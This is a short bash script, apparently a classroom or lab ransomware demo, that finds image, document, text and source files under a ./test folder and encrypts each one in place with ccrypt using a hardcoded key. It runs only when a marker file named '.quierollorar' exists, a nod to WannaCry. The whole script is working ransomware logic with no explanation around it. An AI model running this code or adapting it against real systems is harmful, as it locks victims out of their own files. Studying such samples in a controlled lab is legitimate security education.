#!/bin/bash
KEY=cybersec42
FOLDER="${PWD}"/test

# Security check: if the file .quierollorar doesn't exist, exit.
if [ ! -e "${FOLDER}"/.quierollorar ]; then
	exit
fi

# Find all files with specific extension
FILES=$(find "${FOLDER}" -regextype posix-egrep -regex ".*\.(jpg|gif|png|jpeg|pdf|doc|docx|png|txt|c|cpp)")
for file in $FILES;
do
	ccrypt -e "${file}" -K $KEY &>/dev/null
done;
